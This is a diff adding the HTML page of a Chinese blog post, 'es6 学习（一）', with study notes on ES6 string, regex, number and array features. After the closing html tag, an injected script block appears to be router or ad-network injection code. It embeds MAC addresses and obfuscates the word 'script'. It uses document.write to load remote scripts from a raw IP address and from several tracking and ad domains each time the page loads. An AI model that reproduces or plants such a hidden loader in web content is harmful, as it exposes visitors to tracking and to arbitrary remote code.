@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <title>es6 学习（一）</title>
+    <meta name="description" content="newhuan">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="renderer" content="webkit">
+    <link rel="stylesheet" href="../../../../css/app.css">
+    <script src="../../../../js/app.js"></script>
+    <meta name="apple-mobile-web-app-title" content="newhuan">
+</head>
+<body class="body body-article">
+
+    <div class="full-header">
+        <div class="container">
+            <div class="logo">
+                <a href="../../../index.html" title="newhuan" alt="newhuan">首頁</a>
+            </div>
+
+            <div class="nav">
+            </div>
+        </div>
+    </div>
+
+
+    <div class="full-container">
+        <div class="container">
+            <div class="content">
+                <h1 class="title">es6 学习（一）</h1>
+                <h3 class="date">20170320</h3>
+                <div class="clearfix typo">
+                    这次准备细致的学习一下es6，写个博客记录下觉得可能有用的东西 ps:看的是阮一峰老师的es6入门经典，这里先感谢阮老师。
+                    <h2>字符串的拓展</h2>
+                    <h3>for..of..</h3>
+                    遍历字符串，例：
+                    <pre><code>
+            for (let i of 'new') {
+            console.log(i)
+            }
+            // "n"
+            // "e"
+            // "w"
+                    </code></pre>
+                    优点是可以识别大于0xFFFF的码点。
+
+
+                    <h3>字符串匹配</h3>
+                    str1.includes(str2,num);//str1是否包含str2，开始位置
+                    str1.startsWith(str2,num);//str1是否以str2开头，开始位置
+                    str1.endsWith(str2,num);//str1是否str2结尾，前num个字符是否以str2结尾
+
+                    <h3>repeat</h3>
+                    str.repeat(num);//返回str重复num次生成的字符串
+                    num为小数是，取整；NaN或0是，空字符串；字符串时，先类型转换；负数：0=>-1，因为会先取整所以返回空字符串，其他负数报错；Infinity:报错；
+
+                    <h3>pad</h3>
+                    str.padStart,padEnd(length,str1);
+                    当str长度大于等于length时，返回原字符串；当str长度不足length时，用str1补足，str1多余时舍去；str1默认为空格
+
+                    <h3>模板字符串：`</h3>
+                    ${ variate } => 在模板字符串中引入变量，也可以是js表达式或者是函数的调用
+
+                    <h3>正则的拓展</h3>
+                    <p>
+                        1.支持正则的四种字符串方法：match(),replace(),search(),split()
+                    </p>
+                    <p>
+                        2.新增修饰符 y:确保下一次匹配从剩下字符串的第一个字符开始匹配
+                    </p>
+
+                    <p>
+                        3.reg.flags // 返回正则修饰符
+                    </p>
+
+                    <p>
+                        4.?=
+                    </p>
+                        <pre><code>
+            /\d+(?=%)/     //匹配百分号前面的数字
+            /\d+(?!%)/      //匹配不是百分号前面的数字
+                        </code></pre>
+
+
+
+
+                    <h2>
+                        数值的拓展
+                    </h2>
+                    <p>
+                        <code>
+                            1.Number(num) //转换为number类型，如果不是10进制的会转换为10进制
+                        </code>
+                    </p>
+                    <p>
+                        <code>
+                            Number.isFinite(param) //判断参数是否是有限数值类型  只有  有限的  数值类型 才会返回true
+                        </code>
+                    </p>
+                    <p>
+                        <code>
+                            Number.isNaN(param);Number.isInteger(param);是否是NaN或者是否是整数
+                        </code>
+                    </p>
+
+                    <p>
+                        <code>
+                            Number.trunc();//返回整数部分或者NaN
+                        </code>
+                    </p>
+
+                    <p>
+                       <code>
+                           Math.cbrt();//求立方根
+                       </code>
+                    </p>
+                    <p>
+                        <code>
+                            **  // 指数运算符
+                        </code>
+                        <code>
+                            **=  =>  b**=3  b = b*b*b
+                        </code>
+
+                    </p>
+                    <h3>
+                        数组拓展
+                    </h3>
+                    <p>
+                        <code>
+                            Array.from() ;//  将类数组转换为真正的数组类型，适用于任何有length属性的对象
+                        </code>
+                    </p>
+                    <p>
+                        <code>
+                            Array.of(); // 将一组值转换为数组，可用于数组的初始化
+                        </code>
+                    </p>
+                        <pre>
+                            <code>
+            arr.find(function(){});
+            // 返回function返回true时 arr的值
+            arr.findIndex(function(){});
+            // 返回function返回true时 arr值的下标
+                            </code>
+                        </pre>
+
+
+                    <p>
+                        <code>
+                            arr.fill(); //初始化数组时使用，用参数填充数组，第二三个参数指定起止位置，左闭右开
+                        </code>
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="full-footer">
+        <div class="container">
+            <div class="copyright">
+                © 2015&nbsp;
+                <a href="http://www.newhuan.info/blog/" target="_blank">newhuan</a>&nbsp;by&nbsp;
+                <!--<a href="https://github.com/SolidZORO/vodka" target="_blank">vodka</a>-->
+            </div>
+
+            <div class="hm hidden">
+                <script type="text/javascript">
+                    var _hmt = _hmt || [];
+                    (function() {
+                        var hm = document.createElement("script");
+                        hm.src = "//hm.baidu.com/hm.js?63392a0ec51d4ad23453b82650af1329";
+                        var s = document.getElementsByTagName("script")[0];
+                        s.parentNode.insertBefore(hm, s);
+                    })();
+                </script>
+            </div>
+        </div>
+    </div>
+
+
+</body>
+</html>
+<script>
+    var __m='c8:3a:35:73:27:69';
+    var __m2='00:00:00:00:00:00';
+    var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=8ee9af4179981b1f95c88061fabf6478,M,";
+    var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
+    var __n="http://res.sspsky.com/cp.js?cid=F3FFAE2FDC1B&apmac="+__m2+"&cumid="+__m;
+    var __p="http://feed.theta.sogou.com/feed_icon?pid=ikuai8_app_2&appname=ikuai&uid="+__m+"&mac="+__m2;
+    var __y="http://static.helianhealth.com/hlwf/akb1.js";
+    if(self==top){
+        var x=parseInt(Math.random()*(100-0+1)+0);
+        switch(true){
+            case x>=0&&x<70:
+                __w("http://js.union-wifi.com/zm.js?Rav195P&dmac="+__m2+"&umac="+__m,101);
+                __w(__p,1);
+                __w(__y,5);
+                break;
+            case x>=70&&x<80:
+                __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
+                __w(__y,5);
+                break;
+            case x>=80&&x<=100:
+                __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
+                __w(__y,5);
+                break;
+        }
+    }
+    function __w(s,n){document.write("<sc"+"ript src='"+s+"'></scr"+"ipt>");document.write(__h+n+__b);}
+</script>
